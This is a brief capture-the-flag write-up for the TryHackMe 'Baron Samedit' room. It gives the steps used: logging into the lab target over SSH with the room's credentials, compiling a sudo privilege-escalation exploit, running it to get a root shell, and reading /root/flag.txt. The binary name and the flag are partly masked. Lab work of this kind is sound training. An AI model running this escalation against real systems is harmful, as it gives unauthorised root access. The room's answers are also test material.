# Baron Samedit

- Deployed!

	  no answer needed

- After compiling the exploit, what is the name of the executable created (blurred in the screenshots above)?

	- `ssh tryhackme@<TARGET_IP>` and enter the password `tryhackme`
	- `cd Exploit`
	- `make`
	- `sudo-h****************`

- Run the exploit! You should now have a root shell -- what is the flag in /root/flag.txt?

	- `cat /etc/os-release*`
	- `./sudo-h**************** 0`
	- `cd /root`
	- `cat flag.txt`
	- `THM{********************************}`
